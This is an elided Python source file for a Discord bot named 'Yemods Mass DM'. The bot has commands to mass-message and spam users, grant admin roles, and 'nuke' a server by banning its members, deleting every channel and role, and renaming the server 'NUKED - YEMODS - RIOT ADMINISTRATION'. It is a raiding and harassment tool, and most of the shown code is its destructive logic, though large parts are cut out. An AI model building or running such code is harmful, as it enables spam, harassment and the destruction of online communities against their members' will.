...
help_menu = f"""
Available commands for the Yemods Mass DM bot :
...
async def on_ready():
    os.system("cls")
    print(colored(f"Yemods initialized as: {client.user}",'blue'))
    print("")
...
async def help(ctx):
    ...
    if validation:
        print(colored("YEMODS - HELP MENU RECEIVED",'magenta'))
        if ctx.guild:
    ...
    if validation:
        ...
        if mode == "all":
            if nickname != "":
                ...
                print(colored(f"{time}",'white'), colored("YEMODS - NICKNAME CHANGE COMPLETE",'magenta'))
...
async def grantadmin(ctx, mode=""):
    ...
    if validation:
        ...
        if mode == "all":
            ...
            print(colored(f"{time}", 'white'), colored("YEMODS - ADMIN GRANT COMPLETE", 'magenta'))
        else:
            time = datetime.now().strftime("%H:%M:%S")
            member_id = int(mode.strip("<@!>"))
            member = discord.utils.get(guild.members, id=member_id)
    ...
    if validation:
        ...
        if ctx.guild is not None:
            try:
                ...
                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored("YEMODS - MASS DM COMPLETE",'magenta'))
            except Exception as e:
                time = datetime.now().strftime("%H:%M:%S")
            ...
            try:
                ...
                print(colored(f"{time}",'white'), colored("YEMODS - MASS DM COMPLETE",'magenta'))
            except Exception as e:
                time = datetime.now().strftime("%H:%M:%S")
        ...
        if message != '':
            if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                try:
                    ...
                    print(colored(f"{time}",'white'), colored("YEMODS - USER DM COMPLETE",'magenta'))
                except:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if str(user.id) not in userid and user.id != client.user.id and user.bot != True:
                    if amount < 50:
                        try:
                            ...
                            print(colored(f"{time}",'white'), colored("YEMODS - USER SPAM COMPLETE",'magenta'))
                        except:
                            time = datetime.now().strftime("%H:%M:%S")
        ...
        if mode in nuke_modes:
            if mode == "members":
                    ...
                    for member in guild.members:
                        if str(member.id) not in userid and member.id != client.user.id:
                            if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                try:
                                    await member.ban(reason="YEMODS MASS DM - NUKE")
                                    time = datetime.now().strftime("%H:%M:%S")
                                ...
                                time = datetime.now().strftime("%H:%M:%S")
                                print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
                    print(colored(f"{time}",'white'), colored("YEMODS - MEMBER BAN COMPLETE",'magenta'))
                else:
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    print(colored(f"{time}",'white'), colored("YEMODS - CHANNEL DELETION COMPLETE",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    print(colored(f"{time}",'white'), colored("YEMODS - ROLE DELETION COMPLETE",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
                ...
                if bot_member.guild_permissions.administrator:
                    ...
                    await guild.edit(name="NUKED - YEMODS - RIOT ADMINISTRATION")
                    time = datetime.now().strftime("%H:%M:%S")
                    print(colored(f"{time}",'white'), colored(f"Changed server name to NUKED - YEMODS - RIOT ADMINISTRATION",'green'))
                    print(colored(f"{time}",'white'), colored("YEMODS - NUKE COMPLETED",'magenta'))
                else:
                    time = datetime.now().strftime("%H:%M:%S")
...
os.system("title YEMODS Mass DM")
client.run(token)
